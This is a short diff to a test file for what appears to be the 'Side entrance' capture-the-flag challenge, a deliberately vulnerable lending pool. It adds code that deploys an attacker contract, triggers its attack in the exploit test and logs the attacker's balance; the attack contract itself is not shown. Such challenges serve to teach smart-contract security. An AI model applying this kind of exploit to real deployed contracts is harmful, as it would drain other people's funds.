@@ -21,10 +21,18 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
+
+        const AttackerFactory = await ethers.getContractFactory('AttackSideEntrance',attacker);
+        this.attackpool = await AttackerFactory.deploy(this.pool.address);
+        await this.attackpool.deployed();
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.attackpool.attack();
+        console.log(await ethers.provider.getBalance(attacker.address));
+
     });
 
     after(async function () {
